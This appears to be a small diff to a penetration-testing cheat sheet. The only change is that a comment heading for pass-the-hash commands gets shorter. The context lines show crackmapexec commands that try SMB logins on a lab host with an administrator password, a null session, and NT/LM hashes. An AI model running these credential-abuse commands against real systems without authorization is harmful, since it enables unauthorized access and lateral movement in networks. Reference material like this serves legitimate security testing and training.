@@ -13,7 +13,7 @@ crackmapexec smb 10.10.10.10 -u 'Administrator' -p 'PASSWORD' --local-auth
 crackmapexec smb 10.10.10.10 -u "" up ""
 
 
-# Pass the hash against a subnet
+# Pass the hash
 crackmapexec smb 10.10.10.10 -u administrator -H 'LMHASH:NTHASH' --local-auth
 crackmapexec smb 10.10.10.10 -u administrator -H 'NTHASH'
 
